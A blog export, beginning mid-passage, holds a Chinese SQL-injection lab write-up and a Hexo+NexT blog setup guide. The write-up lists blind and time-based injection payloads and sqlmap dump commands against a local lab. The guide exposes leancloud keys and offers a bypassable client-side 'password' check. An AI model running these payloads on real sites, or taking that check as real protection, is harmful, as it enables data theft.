以此类推就可以得到表名为student 猜测student表中每列的名字 猜测student表的字段数 121' and (select count(column_name) from information_schema.columns where table_name='student')=1# =&gt; false1' and (select count(column_name) from information_schema.columns where table_name='student')=3# =&gt; true 猜测student表的每一列长度 121' and length(substr((select column_name from information_schema.columns where table_name='student' limit 0,1),1))=1# =&gt; false1' and length(substr((select column_name from information_schema.columns where table_name='student' limit 0,1),1))=2# =&gt; true 第一列列名长度为2 121' and length(substr((select column_name from information_schema.columns where table_name='student' limit 1,1),1))=1# =&gt; false1' and length(substr((select column_name from information_schema.columns where table_name='student' limit 1,1),1))=4# =&gt; true 第二列列名长度为4 121' and length(substr((select column_name from information_schema.columns where table_name='student' limit 2,1),1))=1# =&gt; false1' and length(substr((select column_name from information_schema.columns where table_name='student' limit 2,1),1))=5# =&gt; true 第三列列名长度为5 猜测student表的每一列列名 用猜测表名的方法进行猜测 1231' and ascii(substr((select column_name from information_schema.columns where table_name='student' limit 0,1),1,1))&gt;97# =&gt; true1' and ascii(substr((select column_name from information_schema.columns where table_name='student' limit 0,1),1,1))&lt;122# =&gt; true…………………… 用这种方法就可以将每个表名猜出，依次为id,name,score 这一小问在上一问的基础上加入了随机字符串 然而针对上一问的手工盲注方法对这一问同样有效 我推测这种方法应该是为了防sqlmap，让其对返回值的true or false难以检测 后来查阅了一下资料发现是为了模拟正常业务，因为正常情况下页面回显是需要自己去找的。 下一小问只是在查询语句中加入了AND score&gt;60，这样的话只要填上闭合向量’#’就可以过滤掉后面的WHERE条件判定 对于固定输出的内容就不能用盲注了，因为我们不能得到true or false，所以只能用基于时间的注入攻击 先判断是否有注入点 11' and sleep(2)# =&gt;等待，有注入点 判断当前数据库名长度 TIPS：sleep（n） 语句：使数据库在暂停n秒之后再将搜索结果输出；if（（条件），m，n）语句：若条件为真 返回m，若条件为假 返回n； 12341' and sleep(if((length(database())=1),3,0))# =&gt;不等待1' and sleep(if((length(database())=2),3,0))# =&gt;不等待1' and sleep(if((length(database())=3),3,0))# =&gt;不等待1' and sleep(if((length(database())=4),3,0))# =&gt;等待 则数据库名长度为4 判断数据库名 TIPS： mid(database(), m, n):返回数据库名的第m位之后的n位； 12341' and sleep(if((mid(database(),1,1)='t'),3,0))# =&gt; 't'1' and sleep(if((mid(database(),2,1)='e'),3,0))# =&gt; 'e'1' and sleep(if((mid(database(),3,1)='s'),3,0))# =&gt; 's'1' and sleep(if((mid(database(),4,1)='t'),3,0))# =&gt; 't' 所以数据库名为test 判断表的个数 11' and sleep(if(((select count(table_name) from information_schema.tables where table_schema=database())=1),3,0))# =&gt;等待 有一个表 猜测每个表的长度 121' and sleep(if(((select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=1),2,0))# =&gt;不等待1' and sleep(if(((select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=7),2,0))# =&gt;等待 表名长度为7 判断表名 123456781' and sleep(if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97),2,0))# =&gt;等待1' and sleep(if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;122),2,0))# =&gt;等待1' and sleep(if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;109),2,0))# =&gt;等待1' and sleep(if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;118),2,0))# =&gt;不等待1' and sleep(if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;115),2,0))# =&gt;等待1' and sleep(if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;117),2,0))# =&gt;不等待1' and sleep(if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;116),2,0))# =&gt;不等待1' and sleep(if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=115),2,0))# =&gt;等待 则表名的第一个字母为’s’以此类推可以得到表名’student’ 判断表中列数 121' and sleep(if(((select count(column_name) from information_schema.columns where table_name='student')=1),2,0))# =&gt; 不等待1' and sleep(if(((select count(column_name) from information_schema.columns where table_name='student')=3),2,0))# =&gt; 等待 字段数为3 判断表中每列长度 1231' and sleep(if((length(substr((select column_name from information_schema.columns where table_name='student' limit 0,1),1))=2),2,0))# =&gt; 等待：长度为21' and sleep(if((length(substr((select column_name from information_schema.columns where table_name='student' limit 1,1),1))=4),2,0))# =&gt;等待：长度为41' and sleep(if((length(substr((select column_name from information_schema.columns where table_name='student' limit 2,1),1))=5),2,0))# =&gt;等待：长度为5 判断表中每列列名 11' and sleep(if((ascii(substr((select column_name from information_schema.columns where table_name='student' limit 0,1),1,1))&gt;97),1,0))# 一步一步来就可以搞定 这一小问是更新数据库操作，我们可以使用更新数据注入方式来向数据库中非法插入数据，思路就是在insert、update、delete语句中人为构造语法错误，利用如下语句： 12UPDATE student SET score=''inject here'' WHERE id=1;UPDATE student SET score='"inject here"' WHERE id=1; 我将在sqlmap中演示 利用sqlmap自动化注入并用wireshark抓包分析 对于普通查询结果的场景，我们可以使用Union查询的方式 1sqlmap -u "http://127.0.0.1/sql_injection/1.php?id=1&amp;submit=submit" 这样一来我们就找到了Union联合查询，Boolean-based和Time-based3种不同方式的注入点。 接着开始搞事情 1sqlmap -u "http://127.0.0.1/sql_injection/1.php?id=1&amp;submit=submit" --current-db --current-user 1sqlmap -u "http://127.0.0.1/sql_injection/1.php?id=1&amp;submit=submit" --tables -D test --columns dump数据库内容 1sqlmap -u "http://127.0.0.1/sql_injection/1.php?id=1&amp;submit=submit" --dump -T "student" -D "test" 通过抓包分析可以得出sqlmap的查询语句 大致意思就是先判断是否有注入点，再判断过滤字符，接着判断id的最大长度（推测应该是使用二分法），然后就是用我上述手工注入的方法:数据库名长度=&gt;数据库名=&gt;表的个数=&gt;每个表名长度=&gt;每个表名=&gt;列的个数=&gt;每个列名长度=&gt;每个列名。不过我发现sqlmap用了很多随机字符串拼接的方式。 对于仅返回true or false结果的场景，我们可以使用Union查询的方式就失效了，只能布尔查询。 1sqlmap --technique=B -u "http://127.0.0.1/sql_injection/2.php?id=1&amp;submit=submit" --batch 有布尔盲注注入点，开始搞事情 1sqlmap --technique=B -u "http://127.0.0.1/sql_injection/2.php?id=1&amp;submit=submit" --tables -D test 1sqlmap --technique=B -u "http://127.0.0.1/sql_injection/2.php?id=1&amp;submit=submit" --dump -D test -T student 抓包分析一下 大体看了一下前面的查询语句和Union查询没什么区别，爆库也是按照上述的方法 选取一条感觉和我手工注入的方式很相似，然后再进行转码分析一下，发现它是采用二分法来依次确定字母ascii码值的 第三种对于返回值中夹杂着随机字符串的 当我使用如下命令时发现并不能成功 1sqlmap -u "http://127.0.0.1/sql_injection/3.php?id=1&amp;submit=submit" --technique-B 于是使用 1sqlmap -u "http://127.0.0.1/sql_injection/3.php?id=1&amp;submit=submit" 发现注入点 但是奇怪的是这却是boolean-based的盲注，继续进行发现它还是以Time-based进行注入的，应该是随机字符串防御住了布尔盲注 1sqlmap -u "http://127.0.0.1/sql_injection/3.php?id=1&amp;submit=submit" --tables -D test --columns -T student 这一题也有点类似 1sqlmap --technique=B -u "http://127.0.0.1/sql_injection/4.php?id=1&amp;submit=submit" 在sqlmap运行的过程中，发现了如下日志 解答了刚才的疑惑，原来是添加了随机字符串之后sqlmap无法处理动态HTTP返回值 忽略字符串，终于找到了注入点 以下就可以进行爆库操作。 如果返回值是一个固定的值那么只能采用Time-based 1sqlmap --technique=T -u "http://127.0.0.1/sql_injection/5.php?id=1&amp;submit=submit" --batch 抓包查看 ###参考资料 https://blog.csdn.net/xiejunna/article/details/76576804 https://my.oschina.net/duwaiweb/blog/80578 https://blog.csdn.net/we_shell/article/details/37772941 https://www.cnblogs.com/dee0912/p/5240370.html https://blog.csdn.net/qq_35544379/article/details/77351783 https://blog.csdn.net/Code_My_Life/article/details/48135319 https://blog.csdn.net/dgeek/article/details/69525403 https://blog.csdn.net/baidu_37108358/article/details/80766939 https://wps2015.org/drops/drops/%E5%88%A9%E7%94%A8insert%EF%BC%8Cupdate%E5%92%8Cdelete%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE.html 实验总结与心得 对于注入，总的来说有3种主要方式：联合查询、布尔盲注、时间盲注。这三种方式各有各自特点。我通过手工注入从获取数据库名到爆库，直到最后还可以进一步联合查询sys数据库中的敏感信息（这些也是可以做的）。 联合查询：适用于有返回结果的注入方式，查询速度较快。 boolean-based方式：适用于返回值只有true or false的情况，我们可以用二分法不断地判断正误，从而一个字母一个字母地找出数据库名、表名、列名。 time-based方式：适用于不管有没有返回结果均返回固定值的方式，主要是用到了注入中的sleep()函数，这样更慢但同时也更隐蔽。 一般注入方式的选择是：先Union，再boolean-based，最后time-based。 至于随机字符串，它们对于手工注入丝毫没有影响，主要是影响sqlmap，因为每次地返回结果是动态的就会导致sqlmap工作异常，这是一种很好的屏蔽机制。]]></content>
      <categories>
        <category>网络安全实验</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
        <tag>sqlmap使用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo+next搭建博客指南]]></title>
    <url>%2F%E6%95%99%E7%A8%8B%2FHexo-next%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%8C%87%E5%8D%97%2F</url>
    <content type="text"><![CDATA[Hexo+next搭建博客指南我以前用的博客系统是wordpress，虽然搭起来比较方便，但是权限少，个人觉得wordpress博客系统架构有点混乱。听了@Xieldy和@barriery的建议，开始尝试Hexo系统，发现这个博客系统还基于Flask架构来写的, 我在菊厂实习的时候刚好用flask开发过后台，所以对这个架构比较熟悉。现在来分享一下自己建站的经历（踩的坑）。 我云主机的系统是Ubuntu16.04 首先安装nodejs 一开始我使用的apt源安装，但是Ubuntu源中的nodejs时旧版本，用apt源安装会导致hexo命令异常，所以需要在安装后更新nodejs。 123sudo apt-get install nodejssudo apt install nodejs-legacysudo apt install npm 更换成淘宝的镜像，否则非常慢 1sudo npm config set registry https://registry.npm.taobao.org 可以通过 sudo npm config list 查看是否生效 安装更新版本的工具N 1sudo npm install n -g 更新版本 1sudo n stable 可以看到有 installed：版号，说明更新成功 安装hexo 1sudo npm install -g hexo 选一个空目录创建根目录模版 我选择的是/var/www/html/目录下 1sudo hexo init 下载next主题模版 1sudo git clone https://github.com/iissnan/hexo-theme-next.git themes/next 在根目录_config.yml文件中启用next主题 1theme: next PS: 所有配置文件内，每一项配置的冒号后面都要加上空格 设置语言 在根目录_config.yml文件中 1language: zh-Hans 主题选择 在主题配置文件中，查找scheme, 选择你喜欢的主题对其反注释 12345# 主题中的主题# scheme: Musescheme: Mist# scheme: Pisces# scheme: Gemini 背景设置 在主题配置文件中，查找canvas： 1234567891011# Canvas-nestcanvas_nest: false# three_wavesthree_waves: false# canvas_linescanvas_lines: false# canvas_spherecanvas_sphere: false# Only fit scheme Pisces# Canvas-ribboncanvas_ribbon: true 开启相应的背景，只要把对应的false设置为true，记得把其他都改为false 修改内容区域宽度 Next 对内容的宽度的设定如下： 700px，当屏幕宽度 &lt; 1600px 900px，当屏幕宽度 &gt;= 1600px 移动设备下，宽度自适应 在主题目录下的 source/css_variables/custom.styl 文件，新增变量： 1234// 修改成你期望的宽度$content-desktop = 700px// 当视窗超过 1600px 后的宽度$content-desktop-large = 900px 此方法不适用于 Pisces Scheme， Pisces Scheme 编辑themes/next/source/css/_schemes/Picses/_layout.styl文件，更改以下 css 选项定义值 123.header &#123;width: 1150px;&#125;.container .main-inner &#123;width: 1150px;&#125;.content-wrap &#123;width: calc(100% - 260px);&#125; 文章内链接样式美化 在主题目录下，将source/css/_custom/custom.styl文件修改如下： 1234567891011// 文章内链接文本样式.post-body a&#123; color: #0593d3; border-bottom: none; border-bottom: 1px solid #0593d3; &amp;:hover &#123; color: #fc6423; border-bottom: none; border-bottom: 1px solid #fc6423; &#125;&#125; 文章内代码美化 行内代码 在主题目录下，将source/css/_custom/custom.styl文件修改如下： 123456789//行内代码样式code &#123; color: #c7254e; background: #f9f2f4; border: 1px solid #d6d6d6; padding:1px 4px; word-break: break-all; border-radius:4px;&#125; 区块代码 在主题目录下，修改config.yml文件： 12# 样式可选： normal | night | night eighties | night blue | night brighthighlight_theme: night 添加文章结束语 添加模板文件 在主题目录下/layout/_macro中新建 passage-end-tag.swig文件,并添加以下内容： 1234567&lt;div&gt; &#123;% if not is_index %&#125; &lt;div style="text-align:center;color: #ccc;font-size:14px;"&gt; -------------本文结束&lt;i class="fa fa-paw"&gt;&lt;/i&gt;感谢您的阅读------------- &lt;/div&gt; &#123;% endif %&#125;&lt;/div&gt; 导入模板文件 在/layout/_macro/post.swig文件中，找到： 123&#123;#####################&#125;&#123;### END POST BODY ###&#125;&#123;#####################&#125; 在上面代码之前添加： 12345&lt;div&gt; &#123;% if not is_index %&#125; &#123;% include 'passage-end-tag.swig' %&#125; &#123;% endif %&#125;&lt;/div&gt; 配置 在主题配置文件中添加： 123# 文章末尾添加“本文结束”标记passage_end_tag: enabled: true 增强文章底部版权信息 增加文章md文件的头部信息中添加copyright: true时，添加版权声明 增加文章标题、发布时间、更新时间等信息 在目录next/layout/_macro/下找到post-copyright.swig，进行部分修改： 12345678910111213141516171819202122232425262728&#123;% if page.copyright %&#125;&lt;ul class="post-copyright"&gt; &lt;li class="post-copyright-author"&gt; &lt;strong&gt;本文标题:&lt;/strong&gt; &lt;a href="&#123;&#123; url_for(page.path) &#125;&#125;"&gt;&#123;&#123; page.title &#125;&#125;&lt;/a&gt; &lt;/li&gt; &lt;li class="post-copyright-author"&gt; &lt;strong&gt;&#123;&#123; __('post.copyright.author') + __('symbol.colon') &#125;&#125;&lt;/strong&gt; &#123;&#123; config.author &#125;&#125; &lt;/li&gt; &lt;li class="post-copyright-author"&gt; &lt;strong&gt;发布时间:&lt;/strong&gt; &#123;&#123; page.date.format("YYYY年MM月DD日 - HH:MM") &#125;&#125; &lt;/li&gt; &lt;li class="post-copyright-author"&gt; &lt;strong&gt;最后更新:&lt;/strong&gt; &#123;&#123; page.updated.format("YYYY年MM月DD日 - HH:MM") &#125;&#125; &lt;/li&gt; &lt;li class="post-copyright-link"&gt; &lt;strong&gt;&#123;&#123; __('post.copyright.link') + __('symbol.colon') &#125;&#125;&lt;/strong&gt; &lt;a href="&#123;&#123; post.permalink &#125;&#125;" title="&#123;&#123; post.title &#125;&#125;"&gt;&#123;&#123; post.permalink &#125;&#125;&lt;/a&gt; &lt;/li&gt; &lt;li class="post-copyright-license"&gt; &lt;strong&gt;&#123;&#123; __('post.copyright.license_title') + __('symbol.colon') &#125;&#125; &lt;/strong&gt; &#123;&#123; __('post.copyright.license_content', theme.post_copyright.license_url, theme.post_copyright.license) &#125;&#125; &lt;/li&gt;&lt;/ul&gt;&#123;% endif %&#125; 自定义文章的默认头部信息 在根目录的/scaffolds/post.md文件中添加： 12345678910---title: &#123;&#123; title &#125;&#125;date: &#123;&#123; date &#125;&#125;tags: #标签categories: #分类copyright: true #版权声明permalink: 01 #文章链接，有默认值top: 0 #置顶优先级password: #密码保护--- 文章加密访问(其实可以不用) 打开主题目录下layout/_partials/head.swig文件,在meta标签后面插入这样一段代码： 12345678910&lt;script&gt; (function()&#123; if('&#123;&#123; page.password &#125;&#125;')&#123; if (prompt('请输入文章密码') !== '&#123;&#123; page.password &#125;&#125;')&#123; alert('密码错误！'); history.back(); &#125; &#125; &#125;)();&lt;/script&gt; 然后文章头部信息中添加password： password: 你设置的密码 如果password后面为空，则表示不用密码。 博文置顶 安装hexo-generator-index插件 1npm install hexo-generator-index--save 替换代码 把node_modules/hexo-generator-index/lib/generator.js内的代码替换为： 12345678910111213141516171819202122232425262728'use strict';var pagination = require('hexo-pagination');module.exports = function(locals)&#123; var config = this.config; var posts = locals.posts; posts.data = posts.data.sort(function(a, b) &#123; if(a.top &amp;&amp; b.top) &#123; // 两篇文章top都有定义 if(a.top == b.top) return b.date - a.date; // 若top值一样则按照文章日期降序排 else return b.top - a.top; // 否则按照top值降序排 &#125; else if(a.top &amp;&amp; !b.top) &#123; // 以下是只有一篇文章top有定义，那么将有top的排在前面（这里用异或操作居然不行233） return -1; &#125; else if(!a.top &amp;&amp; b.top) &#123; return 1; &#125; else return b.date - a.date; // 都没定义按照文章日期降序排 &#125;); var paginationDir = config.pagination_dir || 'page'; return pagination('', posts, &#123; perPage: config.index_generator.per_page, layout: ['index', 'archive'], format: paginationDir + '/%d/', data: &#123; __index: true &#125; &#125;);&#125;; 设置top值 在文章头部信息中添加top值，数值越大文章越靠前: 123---top: 100--- 增强文章底部标签 修改模板/themes/next/layout/_macro/post.swig，搜索 rel=”tag”&gt;#，将 #换成 1&lt;i class="fa fa-tag"&gt;&lt;/i&gt; 修改打赏 在主题配置文件中找到如下行，并作出相应的修改，然后上传你的微信和支付宝二维码到博客根目录下的source/img文件夹中 12345# 打赏设置reward_comment: 坚持原创技术分享，您的支持将鼓励我继续创作！wechatpay: /assets/img/weixin.jpgalipay: /assets/img/alipay.jpg# bitcoin: /images/bitcoin.png 字体不闪动设置 修改文件next/source/css/_common/components/post/post-reward.styl，然后注释其中的函数wechat:hover和alipay:hover，如下： 123456789101112/* 注释文字闪动函数#wechat:hover p&#123;animation: roll 0.1s infinite linear;-webkit-animation: roll 0.1s infinite linear;-moz-animation: roll 0.1s infinite linear;&#125;#alipay:hover p&#123;animation: roll 0.1s infinite linear;-webkit-animation: roll 0.1s infinite linear;-moz-animation: roll 0.1s infinite linear;&#125;*/ 添加顶部加载条 在主题配置文件_config.yml中，找到pace并修改： 12pace: truepace_theme: pace-theme-minimal 加载条样式有许多，在你找到的位置中可自行更换 主页文章添加阴影效果 打开/themes/next/source/css/_custom/custom.styl,添加： 1234567.post &#123; margin-top: 60px; margin-bottom: 60px; padding: 25px; -webkit-box-shadow: 0 0 5px rgba(202, 203, 203, .5); -moz-box-shadow: 0 0 5px rgba(202, 203, 204, .5); &#125; 给背景添加蜂窝状动画 添加下列代码到你的布局文件中的标签之前（位置/layout/layout.ejs） 1&lt;script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"&gt;&lt;/script&gt; 在引用的同时可以对 Nest 进行相关的配置 color ： 线条颜色, 默认: ‘0,0,0’ ；三个数字分别为(R,G,B)，注意用,分割 opacity : 线条透明度（0~1）, 默认: 0.5 count : 线条的总数量, 默认: 150，（建议修改少点，否者 cpu 占用过高） zIndex : 背景的z-index属性，css属性用于控制所在层的位置, 默认: -1 例如 1&lt;script type="text/javascript" color="0,0,255" opacity='0.7' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"&gt;&lt;/script&gt; 搜索功能 安装 1npm install hexo-generator-searchdb --save 配置 在主题配置文件下，查找local_search: 1234local_search: enable: false trigger: auto top_n_per_article: 1 enable修改为true 在根目录配置文件中，添加以下代码： 12345search: path: search.xml field: post format: html limit: 10000 页脚美化 隐藏网页底部 powered By Hexo 强力驱动 在主题配置文件_config.yml中修改： 1copyright: false 侧边栏添加访问量等信息 获取不蒜子代码 在不蒜子上获取代码： 1&lt;script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"&gt;&lt;/script&gt; 添加js文件 在主题目录下，找到/layout/_layout.swig文件， 在文件的后面，&lt;/body&gt;标签之前，添加上面代码。 安装wordcount 1npm install hexo-wordcount --save 修改布局 在主题目录下，找到/layout/_macro/sidebar.swig文件，查找/nav，在&lt;/nav&gt;标签之前，添加下面代码： 1234567891011121314&lt;br&gt;&lt;br&gt;&lt;div class="site-state-item site-state-posts" style="border-left:none;"&gt; &lt;span class="site-state-item-count" id="busuanzi_value_site_pv"&gt;&lt;/span&gt; &lt;span class="site-state-item-name"&gt;浏览量&lt;/span&gt;&lt;/div&gt;&lt;div class="site-state-item site-state-posts"&gt; &lt;span class="site-state-item-count" id="busuanzi_value_site_uv"&gt;&lt;/span&gt; &lt;span class="site-state-item-name"&gt;访客量&lt;/span&gt;&lt;/div&gt;&lt;div class="site-state-item site-state-posts"&gt; &lt;span class="site-state-item-count"&gt;&#123;&#123;totalcount(site)&#125;&#125;&lt;/span&gt; &lt;span class="site-state-item-name"&gt;总字数&lt;/span&gt;&lt;/div&gt; 文章标签显示设置 在主题配置文件中，查找post_meta： 1234567891011121314# 文章标签显示设置post_meta: item_text: true created_at: true # 发表时间 updated_at: false # 更新时间 categories: true # 分类# 文章字数显示设置（需要wordcount，前面已经下载）post_wordcount: item_text: true wordcount: true # 显示字数 min2read: false # 所需时间 totalcount: false # 总字数 separated_meta: true # 分割符 文章阅读量 注册leancloud统计账号，按照next官方推荐文档 为NexT主题添加文章阅读量统计功能，获取AppID以及AppKey并在主题的_config.yml文件中填写： 1234leancloud_visitors: enable: true app_id: joaeuuc4hsqudUUwx4gIvGF6-gzGzoHsz app_key: E9UJsJpw1omCHuS22PdSpKoh 添加友言评论 在友言评论中注册，并进入管理来获取你的id。修改主题配置文件的友言id： 12# youyan 评论youyan_uid: &quot;2144889&quot; 添加jiathis分享按钮 将你的友言Id添加进去： 123# jiathis 分享按钮jiathis: uid: &apos;2144889&apos; 参考资料以及FAQ ubuntu下搭建LAMP环境 https://blog.csdn.net/lu_embedded/article/details/79604380 ubuntu创建自签名证书 https://www.howtoing.com/how-to-create-a-self-signed-ssl-certificate-for-apache-in-ubuntu-18-04 腾讯云安装let&#39;s encrypt证书 https://www.howtoing.com/how-to-create-a-self-signed-ssl-certificate-for-apache-in-ubuntu-18-04 安装Next主题 http://theme-next.iissnan.com/getting-started.html#install-next-theme Next github源码包 https://github.com/iissnan/hexo-theme-next GitHub+Hexo 搭建个人网站详细教程 https://zhuanlan.zhihu.com/p/26625249 hexo使用手册 https://hexo.io/docs/server 如何更新npm（它要在themes目录下才能运行，不更新在ubuntu16.04环境下hexo命令会出现异常） https://blog.csdn.net/y5492853/article/details/79529410 Hexo-NexT搭建个人博客 https://neveryu.github.io/2016/09/03/hexo-next-one/ hexo中获取图片失败问题 https://www.jianshu.com/p/c2ba9533088a hexo + next主题高级配置 https://www.jianshu.com/p/344cf061598d hexo常用命令 https://segmentfault.com/a/1190000002632530 添加分类与标签 https://www.jianshu.com/p/e17711e44e00 每次在主页上阅读更多的链接总是指向发表时间最早的一篇，解决方法： https://hexo.io/zh-cn/docs/permalinks.html 蜂窝状动画 http://wintersmilesb101.online/2017/03/22/Next-Use-Nest/]]></content>
      <categories>
        <category>教程</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>next</tag>
        <tag>配置</tag>
      </tags>
  </entry>
</search>
